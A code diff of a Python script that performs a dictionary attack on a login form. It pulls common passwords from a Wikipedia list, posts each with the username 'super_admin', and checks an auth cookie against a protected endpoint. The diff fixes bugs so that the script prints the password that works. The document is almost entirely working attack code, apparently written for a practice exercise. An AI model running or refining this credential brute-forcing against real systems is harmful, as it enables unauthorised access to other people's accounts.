@@ -7,7 +7,7 @@ def print_status(response):
     print(response.status_code)
     print(response.cookies)
     print(response.text)
-
+login = "super_admin"
 from lxml import html
 
 response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
@@ -21,19 +21,14 @@ for password in passwords:
     password = str(password).strip()
     print(password)
 
-login = "super_admin"
-
 for password in passwords:
     response = requests.post(url, data = {"login": login, "password": password})
-    cookie_value = response.cookies.get({"auth_cookie"})
+    cookie_value = response.cookies.get("auth_cookie")
     print(cookie_value)
     cookies = {"auth_cookie": cookie_value}
     response2 = requests.post(url2,data = {"auth_cookie":cookies})
-    if response2.text is not "You are NOT authorized":
-        print(response2.password)
+    print(response2.text)
+    if response2.text != "You are NOT authorized":
+        print(password)
         print(response2.text)
 
-'''
-response = requests.post(url2)
-print_status(response)
-'''
